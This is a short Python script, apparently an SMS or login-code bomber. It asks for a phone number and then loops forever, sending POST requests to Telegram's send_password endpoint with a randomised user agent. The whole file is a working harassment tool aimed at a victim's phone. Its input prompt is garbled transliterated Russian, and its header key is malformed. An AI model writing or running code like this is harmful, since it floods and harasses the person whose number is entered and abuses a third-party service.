import requests, fake_useragent, time

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input('Beeante HOMep tenedona: (6es +)')



while True:

 try:
     print('Отправлено')
     response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': "+" + NUMBER})
 except:
     print('Не доставлено')
     time.sleep(5000)